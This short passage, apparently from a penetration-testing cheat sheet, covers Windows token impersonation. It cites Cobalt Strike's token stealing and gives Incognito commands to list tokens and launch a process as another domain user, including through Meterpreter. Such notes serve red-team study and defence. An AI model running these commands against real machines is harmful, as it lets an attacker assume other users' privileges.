Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the ‘Steal Token’ functionality in Cobalt Strike).
#### Incognito
```powershell
# Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
```

> If you’re using Meterpreter, you can use the built-in Incognito module with `use incognito`, the same commands are available.